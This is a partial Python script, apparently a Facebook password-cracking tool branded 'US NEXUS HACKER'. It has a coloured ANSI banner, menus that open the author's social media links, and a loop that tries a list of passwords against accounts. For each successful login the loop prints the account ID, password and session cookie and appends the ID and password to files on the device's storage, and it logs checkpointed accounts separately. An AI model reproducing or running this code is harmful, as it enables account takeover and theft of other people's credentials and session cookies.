...
logo = (""""\033[132m🅁①🄵④🅃
\033[1;32m╔══════════════════════════════════╗╔════════════════════════╗
\033[1;32m║NOTE : \033[37;45mTHE TOOLS IS PAID NOW FREE\033[0;m\033[1;32m     ║║ \x1b[1;93m╭━━━╮╭╮╭━━━┳╮╱╭┳━━━━╮\033[1;32m   ║
\033[1;32m║══════════════════════════════════║║ \x1b[1;93m ┃╭━╮┣╯┃┃╭━━┫┃╱┃┃╭╮╭╮┃\033[1;32m ║
\033[1;32m║AUTHOR    : US NEXUS HACKER  ║║ \x1b[1;91m┃╰━╯┣╮┃┃╰━━┫╰━╯┣╯┃┃╰╯\033[1;32m  ║
\033[1;32m║══════════════════════════════════║║  \x1b[1;93m┃╭╮╭╯┃┃┃╭━━┻━━╮┃╱┃┃\033[1;32m   ║
\033[1;32m║TELEGRAM : https://t.me/usnexushacker       ║║  \x1b[1;91m┃┃┃╰┳╯╰┫┃╱╱╱╱╱┃┃╱┃┃\033[1;32m    ║
\033[1;32m║══════════════════════════════════║║  \x1b[1;93m╰╯╰━┻━━┻╯╱╱╱╱╱╰╯╱╰╯\033[1;32m   ║
\033[1;32m║FACEBOOK    :   fb.com/TamimHossain55
...
| $$  | $$ /$$  \ $$      | $$\  $$$| $$       /$$/\  $$| $$  | $$ /$$  \ $$
|  $$$$$$/|  $$$$$$/      | $$ \  $$| $$$$$$$$| $$  \ $$|  $$$$$$/|  $$$$$$/
 \______/  \______/       |__/  \__/|________/|__/  |__/ \______/  \______/ \033[1;37m\n""")
def ud():
    os.system('clear')
    jalan(logo)
    print(' \033[1;32m[1] Visit My Github Account')
    print(' [2] EXIT')
    opt = input('\n   CHOOSE OPTION >>>\033[1;37m ')
    if opt == '1':
        os.system('xdg-open https://github.com/TamimFuckersHacks/')
        FD()
        return None
...
def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] Visit My Facebook Id')
    print(' [2] EXIT')
...
def o():
    ...
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://https://www.facebook.com/TamimHossain55')
        return None
    if opt == '3':
        os.system('xdg-open https://youtube.com/@cyberxyzbangladesh')
        return None
    if opt == '4':
        os.system('xdg-open https://www.facebook.com/groups/1306272733044430')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[US°NEXUS-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/US°NEXUS-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[US°NEXUS-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/US°NEXUS-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[US°NEXUS] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
